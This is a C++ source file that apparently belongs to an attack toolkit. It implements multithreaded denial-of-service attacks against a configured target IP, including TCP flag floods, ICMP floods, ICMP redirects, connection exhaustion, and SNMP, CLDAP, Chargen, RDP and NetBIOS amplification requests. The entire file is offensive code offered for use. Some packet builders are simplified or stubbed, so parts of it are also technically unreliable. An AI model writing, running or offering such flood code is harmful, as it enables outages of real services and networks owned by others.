#include "l4_attacks.h"
#include <cstring>
#include <random>
#include <chrono>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <iphlpapi.h>
    #define close closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/tcp.h>
    #include <netinet/ip.h>
    #include <netinet/ip_icmp.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
#endif

namespace laitoxx {

// Utility: Calculate checksum
static uint16_t calculate_checksum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len / 2; i++) {
        sum += buf[i];
    }
    if (len % 2) {
        sum += ((uint8_t*)buf)[len - 1];
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return ~sum;
}

// Utility: Random IP generator
static std::string random_ip() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1, 254);

    return std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen));
}

// ============================================================================
// ACK Flood
// ============================================================================
void ACKFlood::start() {
    log("Starting ACK flood on " + config_.target_ip + ":" + std::to_string(config_.port));
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ACKFlood::attack_worker, this);
    }
}

void ACKFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        // Set non-blocking
#ifdef _WIN32
        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
#else
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
#endif

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        // Attempt connection (will send SYN)
        connect(sock, (sockaddr*)&addr, sizeof(addr));

        // Small delay then send data (triggers ACK)
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
        char buf[1] = {0};
        send(sock, buf, 1, 0);

        packets_sent_++;
        close(sock);
    });
}

// ============================================================================
// SYN-ACK Flood
// ============================================================================
void SYNACKFlood::start() {
    log("Starting SYN-ACK flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SYNACKFlood::attack_worker, this);
    }
}

void SYNACKFlood::attack_worker() {
    // Note: Requires raw socket privileges
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        // Build TCP packet with SYN+ACK flags
        char packet[40];
        memset(packet, 0, sizeof(packet));

        // Simplified TCP header (would need proper implementation)
        packet[20 + 13] = 0x12; // SYN + ACK flags

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    });
}

// ============================================================================
// RST Flood
// ============================================================================
void RSTFlood::start() {
    log("Starting RST flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&RSTFlood::attack_worker, this);
    }
}

void RSTFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        char packet[40];
        memset(packet, 0, sizeof(packet));

        // TCP header with RST flag
        packet[20 + 13] = 0x04; // RST flag

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    });
}

// ============================================================================
// FIN Flood
// ============================================================================
void FINFlood::start() {
    log("Starting FIN flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&FINFlood::attack_worker, this);
    }
}

void FINFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        char packet[40];
        memset(packet, 0, sizeof(packet));

        // TCP header with FIN flag
        packet[20 + 13] = 0x01; // FIN flag

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    });
}

// ============================================================================
// ICMP Flood
// ============================================================================
void ICMPFlood::start() {
    log("Starting ICMP flood on " + config_.target_ip);
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ICMPFlood::attack_worker, this);
    }
}

void ICMPFlood::attack_worker() {
    worker_loop([this]() {
#ifdef _WIN32
        SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
#else
        SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
#endif
        if (sock == INVALID_SOCKET) return;

        // ICMP Echo Request
        struct {
            uint8_t type;
            uint8_t code;
            uint16_t checksum;
            uint16_t id;
            uint16_t sequence;
            char data[56];
        } icmp_packet;

        memset(&icmp_packet, 0, sizeof(icmp_packet));
        icmp_packet.type = 8; // Echo Request
        icmp_packet.code = 0;
        icmp_packet.id = htons(getpid() & 0xFFFF);
        icmp_packet.sequence = htons(1);

        // Calculate checksum
        icmp_packet.checksum = 0;
        icmp_packet.checksum = calculate_checksum((uint16_t*)&icmp_packet, sizeof(icmp_packet));

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, (char*)&icmp_packet, sizeof(icmp_packet), 0,
               (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::microseconds(100));
    });
}

// ============================================================================
// ICMP Redirect
// ============================================================================
void ICMPRedirect::start() {
    log("Starting ICMP Redirect flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ICMPRedirect::attack_worker, this);
    }
}

void ICMPRedirect::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock == INVALID_SOCKET) return;

        struct {
            uint8_t type;
            uint8_t code;
            uint16_t checksum;
            uint32_t gateway;
            char original_ip_header[28];
        } icmp_packet;

        memset(&icmp_packet, 0, sizeof(icmp_packet));
        icmp_packet.type = 5; // Redirect
        icmp_packet.code = 1; // Redirect for host

        // Gateway IP (attacker or fake)
        inet_pton(AF_INET, random_ip().c_str(), &icmp_packet.gateway);

        icmp_packet.checksum = calculate_checksum((uint16_t*)&icmp_packet, sizeof(icmp_packet));

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, (char*)&icmp_packet, sizeof(icmp_packet), 0,
               (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

// ============================================================================
// CPS Flood
// ============================================================================
void CPSFlood::start() {
    log("Starting CPS (Connections Per Second) flood");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&CPSFlood::attack_worker, this);
    }
}

void CPSFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        // Set non-blocking
#ifdef _WIN32
        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
#else
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
#endif

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        connect(sock, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        // No delay - maximize CPS
    });
}

// ============================================================================
// CONNECTION Flood
// ============================================================================
void CONNECTIONFlood::start() {
    log("Starting CONNECTION flood (hold connections)");

    // Start connection creator threads
    for (int i = 0; i < config_.thread_count / 2; ++i) {
        threads_.emplace_back(&CONNECTIONFlood::attack_worker, this);
    }

    // Start keep-alive thread
    threads_.emplace_back(&CONNECTIONFlood::keep_alive_worker, this);
}

void CONNECTIONFlood::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        // Set timeout
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::lock_guard<std::mutex> lock(sockets_mutex_);
            active_sockets_.push_back(sock);
            packets_sent_++;
        } else {
            close(sock);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    });
}

void CONNECTIONFlood::keep_alive_worker() {
    while (!stop_flag_) {
        std::this_thread::sleep_for(std::chrono::seconds(5));

        std::lock_guard<std::mutex> lock(sockets_mutex_);
        for (auto it = active_sockets_.begin(); it != active_sockets_.end();) {
            char buf[1] = {0};
            if (send(*it, buf, 1, 0) <= 0) {
                close(*it);
                it = active_sockets_.erase(it);
            } else {
                ++it;
            }
        }
    }

    // Cleanup
    std::lock_guard<std::mutex> lock(sockets_mutex_);
    for (auto sock : active_sockets_) {
        close(sock);
    }
    active_sockets_.clear();
}

// ============================================================================
// SNMP Amplification
// ============================================================================
void SNMPAmp::start() {
    log("Starting SNMP amplification");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SNMPAmp::attack_worker, this);
    }
}

std::vector<char> SNMPAmp::build_snmp_packet() {
    // Simplified SNMP GETBULK request
    std::vector<char> packet = {
        0x30, 0x26, // SEQUENCE
        0x02, 0x01, 0x01, // Version (SNMPv2)
        0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63, // Community "public"
        (char)0xa5, 0x19, // GETBULK PDU
        0x02, 0x01, 0x01, // Request ID
        0x02, 0x01, 0x00, // Non-repeaters
        0x02, 0x01, 0x32, // Max-repetitions (50)
        0x30, 0x0e, // Variable bindings
        0x30, 0x0c,
        0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00,
        0x05, 0x00
    };
    return packet;
}

void SNMPAmp::attack_worker() {
    auto packet = build_snmp_packet();

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(161);
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet.data(), packet.size(), 0,
               (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    });
}

// ============================================================================
// Chargen Amplification
// ============================================================================
void ChargenAmp::start() {
    log("Starting Chargen amplification");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&ChargenAmp::attack_worker, this);
    }
}

void ChargenAmp::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(19); // Chargen port
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        char packet[1] = {0};
        sendto(sock, packet, 1, 0, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    });
}

// ============================================================================
// CLDAP Amplification
// ============================================================================
void CLDAPAmp::start() {
    log("Starting CLDAP amplification");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&CLDAPAmp::attack_worker, this);
    }
}

std::vector<char> CLDAPAmp::build_cldap_packet() {
    // Simplified CLDAP search request
    std::vector<char> packet = {
        0x30, 0x84, 0x00, 0x00, 0x00, 0x2d, // SEQUENCE
        0x02, 0x01, 0x01, // Message ID
        0x63, 0x84, 0x00, 0x00, 0x00, 0x24, // Search request
        0x04, 0x00, // Base DN (empty)
        0x0a, 0x01, 0x00, // Scope: base
        0x0a, 0x01, 0x00, // Deref: never
        0x02, 0x01, 0x00, // Size limit
        0x02, 0x01, 0x00, // Time limit
        0x01, 0x01, 0x00, // Types only
        (char)0xa0, 0x84, 0x00, 0x00, 0x00, 0x09, // Filter
        (char)0xa3, 0x84, 0x00, 0x00, 0x00, 0x03,
        0x04, 0x01, 0x2a, // Attribute "*"
        0x30, 0x00 // Attributes (empty)
    };
    return packet;
}

void CLDAPAmp::attack_worker() {
    auto packet = build_cldap_packet();

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return;

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(389); // CLDAP port
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet.data(), packet.size(), 0,
               (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    });
}

// ============================================================================
// RDP Amplification
// ============================================================================
void RDPAmp::start() {
    log("Starting RDP amplification");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&RDPAmp::attack_worker, this);
    }
}

void RDPAmp::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return;

        // RDP cookie request
        char packet[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(3389); // RDP port
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    });
}

// ============================================================================
// NetBIOS Amplification
// ============================================================================
void NetBIOSAmp::start() {
    log("Starting NetBIOS amplification");
    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&NetBIOSAmp::attack_worker, this);
    }
}

void NetBIOSAmp::attack_worker() {
    worker_loop([this]() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return;

        // NetBIOS name query
        char packet[] = {
            0x00, 0x01, // Transaction ID
            0x00, 0x00, // Flags
            0x00, 0x01, // Questions
            0x00, 0x00, // Answer RRs
            0x00, 0x00, // Authority RRs
            0x00, 0x00, // Additional RRs
            0x20, 0x43, 0x4b, 0x41, 0x41, 0x41, 0x41, 0x41, // Encoded name
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00,
            0x00, 0x21, // Type: NB
            0x00, 0x01  // Class: IN
        };

        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(137); // NetBIOS name service
        inet_pton(AF_INET, config_.target_ip.c_str(), &addr.sin_addr);

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&addr, sizeof(addr));
        packets_sent_++;

        close(sock);
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    });
}

} // namespace laitoxx
